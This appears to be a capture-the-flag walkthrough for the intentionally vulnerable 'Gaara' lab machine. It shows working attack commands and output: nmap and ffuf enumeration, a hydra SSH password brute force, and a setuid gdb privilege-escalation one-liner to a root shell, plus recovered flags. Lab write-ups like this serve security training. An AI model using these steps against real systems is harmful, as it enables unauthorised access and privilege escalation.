---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Enumeration

### NMAP scan

Let's perform an `nmap` scan to find the open ports and the services running on the open ports.

```
$ nmap -T5 -Pn -A -p- 192.168.205.142
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-02 13:54 IST
Warning: 192.168.205.142 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.205.142
Host is up (0.073s latency).
Not shown: 62577 closed tcp ports (conn-refused), 2956 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 393.91 seconds
```

There are two open ports:

| Port | Service |
| ---- | ------- |
| 22   | ssh     |
| 80   | http    |

### Web enumeration

Let's visit the web server through our browser.

![1](https://github.com/Kunull/Write-ups/assets/110326359/54c15681-c889-4f61-baac-2cb77914a936)

Nothing useful, just a picture of the anime character [Gaara](https://en.wikipedia.org/wiki/Gaara).

### Directory brute forcing using FFUF

We can use `ffuf` to brute force the web directories on the web server.

```
$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.205.142:80/FUZZ | grep "Status: 200"
________________________________________________

Cryoserver              [Status: 200, Size: 327, Words: 1, Lines: 303, Duration: 75ms]
:: Progress: [220560/220560] :: Job [1/1] :: 546 req/sec :: Duration: [0:10:12] :: Errors: 0 ::
```

If we visit the `/Cryoserver` page, we can find the following information.

![4](https://github.com/Kunull/Write-ups/assets/110326359/f6d40651-cb2d-498d-bc72-f2e0edda2ed7)

So, there are three other directories.

However, all of these include some story regarding the [Gaara](https://en.wikipedia.org/wiki/Gaara) character and serve asrabit holes.


## Exploitation

### Brute forcing SSH password

Now that we know the machine is based on [Gaara](https://en.wikipedia.org/wiki/Gaara), we can assume that there must be a `gaara` user.

Let's brute force the passwords for this `gaara` user.

```
$ hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.205.142
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-02 14:08:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.205.142:22/
[STATUS] 115.00 tries/min, 115 tries in 00:01h, 14344286 to do in 2078:53h, 14 active
[22][ssh] host: 192.168.205.142   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-02 14:10:57
```

| Username | Password  |
| -------- | --------- |
| gaara    | iloveyou2 |

### Logging in through SSH

```
$ ssh gaara@192.168.205.142
The authenticity of host '192.168.205.142 (192.168.205.142)' can't be established.
ED25519 key fingerprint is SHA256:XpX1VX2RtX8OaktJHdq89ZkpLlYvr88cebZ0tPZMI0I.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.142' (ED25519) to the list of known hosts.
gaara@192.168.205.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gaara@Gaara:~$ 
```


## Post Exploitation
### local.txt

Let's `cat` the `local.txt` flag.

```
gaara@Gaara:~$ cat local.txt
c728c520ab0c97b7ea9820a1b73a0254
```

### Privilege escalation

We can use the `find` command to search for files on the system where the `setuid` bit is set.

```
gaara@Gaara:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```

We can now use on of these files to escalate our privilege.

Let's go to [GTFOBins](https://gtfobins.github.io) to search for an exploit for the `gdb` utility. 

![3](https://github.com/Kunull/Write-ups/assets/110326359/c41f68aa-fc93-40df-8122-a59d21ea374a)

Since we want a Bash shell, we have to modify the exploit slightly.

```
gdb -nx -ex 'python import os; os.execl("/bin/bash", "sh", "-p")' -ex quit
```

```
gaara@Gaara:~$ gdb -nx -ex 'python import os; os.execl("/bin/bash", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
sh-5.0# whoami
root
```

### proof.txt

We can now `cat` the `proof.txt` flag.

```
sh-5.0# cat /root/proof.txt
2c39a99c3217a56762321da6bf9860b3
```
